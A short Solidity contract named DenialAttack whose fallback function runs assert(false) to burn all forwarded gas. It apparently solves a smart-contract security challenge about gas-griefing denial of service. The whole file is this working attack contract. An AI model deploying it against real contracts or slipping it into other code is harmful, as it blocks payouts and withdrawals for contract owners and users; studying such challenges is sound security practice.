pragma solidity ^0.6.0;

contract DenialAttack {
    
    fallback() external payable {
        // assert uses invalid opcode which consumes all gas
        // before Solidity 0.8.0
        assert(false);
    }

}
